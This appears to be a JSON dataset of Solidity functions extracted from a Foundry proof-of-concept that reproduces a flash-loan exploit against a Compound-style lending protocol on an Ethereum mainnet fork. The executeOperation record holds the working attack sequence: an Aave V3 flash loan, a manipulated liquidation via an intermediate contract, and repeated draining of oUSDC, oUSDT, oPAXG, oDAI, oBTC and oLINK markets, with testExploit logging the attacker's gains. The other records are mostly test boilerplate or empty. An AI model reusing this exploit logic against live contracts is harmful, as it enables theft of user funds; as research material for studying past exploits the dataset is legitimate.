[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        approveAll();\n        (uint112 reservePEPE, uint112 reserveWETH,) = PEPE_WETH.getReserves();\n        uint256 amountOut = calcAmountOut(reservePEPE, reserveWETH, WETH.balanceOf(address(this)));\n        WETHToPEPE(amountOut);\n\n        // oETHER\n        IntermediateContractETH intermediateETH = new IntermediateContractETH();\n        PEPE.transfer(address(intermediateETH), PEPE.balanceOf(address(this)));\n        intermediateETH.start();\n        oETHER.liquidateBorrow{value: 0.000000000000000001 ether}(address(intermediateETH), address(oPEPE));\n        oPEPE.redeem(oPEPE.balanceOf(address(this)));\n        WETH.deposit{value: address(this).balance}();\n\n        // oUSDC\n        {\n            exploitToken(oUSDC);\n            (uint112 reserveUSDC, uint112 reserveWETH1,) = USDC_WETH.getReserves();\n            amountOut = calcAmountOut(reserveWETH1, reserveUSDC, USDC.balanceOf(address(this)));\n            USDCToWETH(amountOut);\n        }\n\n        // oUSDT\n        {\n            exploitToken(oUSDT);\n            (uint112 reserveWETH2, uint112 reserveUSDT,) = WETH_USDT.getReserves();\n            amountOut = calcAmountOut(reserveUSDT, reserveWETH2, USDT.balanceOf(address(this)));\n            USDTToWETH(amountOut);\n        }\n\n        // oPAXG\n        {\n            exploitToken(oPAXG);\n            (uint112 reservePAXG, uint112 reserveWETH3,) = PAXG_WETH.getReserves();\n            amountOut = calcAmountOut(reserveWETH3, reservePAXG, PAXG.balanceOf(address(this)));\n            PAXGToWETH(amountOut);\n        }\n\n        // oDAI\n        {\n            exploitToken(oDAI);\n            (uint112 reserveDAI, uint112 reserveWETH4,) = DAI_WETH.getReserves();\n            amountOut = calcAmountOut(reserveWETH4, reserveDAI, DAI.balanceOf(address(this)));\n            DAIToWETH(amountOut);\n        }\n\n        // oBTC\n        {\n            exploitToken(oBTC);\n            (uint112 reserveWBTC, uint112 reserveWETH5,) = WBTC_WETH.getReserves();\n            amountOut = calcAmountOut(reserveWETH5, reserveWBTC, WBTC.balanceOf(address(this)));\n            WBTCToWETH(amountOut);\n        }\n\n        // oLink\n        {\n            exploitToken(oLINK);\n            (uint112 reserveLINK, uint112 reserveWETH6,) = LINK_WETH.getReserves();\n            amountOut = calcAmountOut(reserveWETH6, reserveLINK, LINK.balanceOf(address(this)));\n\n            LINKToWETH(amountOut);\n        }\n\n        // PEPE\n        PEPEToWETH();\n\n        WETH.approve(address(AaveV3), amount + premium);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 18_476_512);\n        vm.label(address(AaveV3), \"AaveV3\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(PEPE), \"PEPE\");\n        vm.label(address(oPEPE), \"oPEPE\");\n        vm.label(address(oETHER), \"oETHER\");\n        vm.label(address(PEPE_WETH), \"PEPE_WETH\");\n        vm.label(address(Router), \"Router\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(this), 0 ether);\n        deal(address(WETH), address(this), 0);\n        emit log_named_decimal_uint(\"Attacker WETH balance before exploit\", WETH.balanceOf(address(this)), 18);\n\n        AaveV3.flashLoanSimple(address(this), address(WETH), 4000 * 1e18, bytes(\"\"), 0);\n\n        emit log_named_decimal_uint(\"Attacker WETH balance after exploit\", WETH.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IComptroller",
    "source_type": "victim_contract",
    "function_name": "enterMarkets",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IComptroller",
    "source_type": "victim_contract",
    "function_name": "liquidateCalculateSeizeTokens",
    "original_code": "    function liquidateCalculateSeizeTokens(\n        address oTokenBorrowed,\n        address oTokenCollateral,\n        uint repayAmount) external view returns (uint, uint);\n\n}\n\n// File: contracts/InterestRateModel.sol\n\n",
    "description": ""
  },
  {
    "contract/interface": "IntermediateContractETH",
    "source_type": "victim_contract",
    "function_name": "start",
    "original_code": "",
    "description": ""
  }
]